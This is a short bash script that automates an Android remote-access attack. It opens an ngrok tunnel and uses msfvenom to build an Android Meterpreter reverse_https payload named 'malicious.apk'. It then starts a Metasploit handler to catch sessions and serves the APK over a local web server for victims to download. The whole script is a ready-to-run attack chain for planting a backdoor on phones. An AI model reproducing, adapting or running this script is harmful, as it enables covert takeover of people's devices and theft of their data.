#!/bin/bash

# ✅ Step 1: Start Ngrok tunnel (you must already be logged into ngrok)
echo "[*] Starting Ngrok on port 443..."
gnome-terminal -- bash -c "ngrok http 443; exec bash"  # Opens in a new terminal

sleep 6  # Give Ngrok time to initialize

# ✅ Step 2: Fetch Ngrok HTTPS URL
NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o "https://[a-zA-Z0-9.-]*ngrok.io" | head -n1)

if [ -z "$NGROK_URL" ]; then
    echo "❌ Failed to retrieve Ngrok URL. Make sure Ngrok is running."
    exit 1
fi

echo "[+] Ngrok URL: $NGROK_URL"

# ✅ Step 3: Create payload
echo "[*] Generating payload..."
msfvenom -p android/meterpreter/reverse_https LHOST=${NGROK_URL#https://} LPORT=443 -o malicious.apk

if [ $? -ne 0 ]; then
    echo "❌ Payload generation failed."
    exit 1
fi

echo "[+] Payload saved as malicious.apk"

# ✅ Step 4: Start Metasploit handler
echo "[*] Launching Metasploit..."
gnome-terminal -- bash -c "msfconsole -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_https; set LHOST 0.0.0.0; set LPORT 443; set ExitOnSession false; exploit -j'; exec bash"

# ✅ Step 5: Optional - Start local server to host the APK
echo "[*] Starting local server at http://localhost:8000/malicious.apk"
python3 -m http.server 8000
